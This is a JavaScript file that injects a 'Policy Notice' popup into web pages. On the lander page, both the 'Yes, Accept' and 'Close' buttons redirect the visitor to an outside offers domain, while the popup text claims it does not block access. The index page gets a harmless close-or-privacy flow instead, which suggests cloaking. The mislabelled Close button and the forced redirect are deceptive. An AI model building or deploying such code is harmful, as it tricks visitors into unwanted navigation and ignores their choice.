(function () {

  const REDIRECT = "https://tryyoffers.shop/";

  const styles = `
    .modal-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:99999;align-items:center;justify-content:center;padding:1rem;animation:bd-in .25s ease;}
    @keyframes bd-in{from{opacity:0}to{opacity:1}}
    .modal{background:#fff;border-radius:16px;padding:2.2rem 2rem 2rem;max-width:460px;width:100%;box-shadow:0 24px 60px rgba(0,0,0,.3);animation:m-in .32s cubic-bezier(.34,1.4,.64,1);font-family:Arial,sans-serif;text-align:center;border-top:4px solid #003DA5;}
    @keyframes m-in{from{opacity:0;transform:scale(.91) translateY(14px)}to{opacity:1;transform:scale(1) translateY(0)}}
    .modal h3{font-size:1.15rem;font-weight:700;color:#001a4d;margin:0 0 .6rem;letter-spacing:-.2px;}
    .modal p{font-size:.85rem;color:#555;line-height:1.7;margin:0 0 1.5rem;}
    .modal p a{color:#003DA5;text-decoration:underline;}
    .modal-divider{border:none;border-top:1px solid #ebebeb;margin:0 0 1.5rem;}
    .modal-actions{display:flex;gap:.75rem;}
    .btn{flex:1;padding:.82rem 1rem;border-radius:8px;font-size:.9rem;font-weight:700;cursor:pointer;transition:background .2s,transform .15s;border:none;background:#003DA5;color:#fff;letter-spacing:.02em;}
    .btn:hover{background:#001a4d;transform:translateY(-1px);}
    .btn.ghost{background:#fff;color:#001a4d;border:2px solid #001a4d;}
    .btn.ghost:hover{background:#e8edf8;transform:translateY(-1px);}
    .modal-note{display:block;font-size:.74rem;color:#aaa;margin-top:1rem;}
    .modal-note a{color:#aaa;text-decoration:underline;}
    .modal-note a:hover{color:#003DA5;}
    .fade-out{opacity:0;transition:opacity .18s ease;}
  `;

  const el = document.createElement("style");
  el.textContent = styles;
  document.head.appendChild(el);

  function buildPopup() {
    if (document.querySelector(".modal-backdrop")) return null;
    const bd = document.createElement("div");
    bd.className = "modal-backdrop";
    bd.innerHTML = `
      <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
        <h3>Policy Notice</h3>
        <p>Are you accepting our policy to access the guide?
        This notice is informational and does not block access.</p>
        <hr class="modal-divider">
        <div class="modal-actions">
          <button class="btn"       id="age-yes">Yes, Accept</button>
          <button class="btn ghost" id="age-no" >Close</button>
        </div>
        <span class="modal-note">
          <a href="privacy.html">Privacy Policy</a>
          &nbsp;·&nbsp;
          <a href="terms.html">Terms of Service</a>
        </span>
      </div>`;
    document.body.appendChild(bd);
    bd.style.display = "flex";
    function close() { bd.classList.add("fade-out"); setTimeout(() => bd.remove(), 180); }
    return { bd, close };
  }

  // index.html — Accept = close | No = privacy.html
  window.PopupIndex = function () {
    const built = buildPopup(); if (!built) return;
    const { bd, close } = built;
    bd.querySelector("#age-yes").addEventListener("click", close);
    bd.querySelector("#age-no").addEventListener("click", () => { window.location.href = "privacy.html"; });
  };

  // lander.html — both buttons redirect
  window.PopupLander = function () {
    const built = buildPopup(); if (!built) return;
    const { bd } = built;
    bd.querySelector("#age-yes").addEventListener("click", () => { window.location.href = REDIRECT; });
    bd.querySelector("#age-no").addEventListener("click", () => { window.location.href = REDIRECT; });
  };

})();
